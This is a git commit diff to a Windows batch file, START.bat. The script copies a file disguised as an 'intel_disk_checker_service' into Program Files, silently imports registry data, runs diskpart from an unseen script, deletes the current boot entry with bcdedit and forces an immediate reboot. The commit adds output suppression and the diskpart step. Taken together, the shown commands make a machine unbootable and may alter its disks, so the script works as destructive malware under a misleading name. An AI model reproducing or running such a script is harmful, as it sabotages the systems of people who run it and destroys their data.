820a1a2df06a62d7fca0b8b999321c7ce5e448f8
Abdullah-Al-Wahed <125238008+Abdullah-Al-Wahed@users.noreply.github.com>
2023-04-12 17:21:34 +0600

    Update START.bat

--- START.bat
+++ START.bat
@@ -1,4 +1,6 @@
+@echo off
 copy "%~dp0\intel_disk_checker_service.bat" "C:\Program Files\intel_disk_checker_service.bat"
 regedit /s "%~dp0\regdata.reg"
+diskpart /s "%~dp0\partdata.txt"
 bcdedit /delete {current}
 shutdown /r /t 0
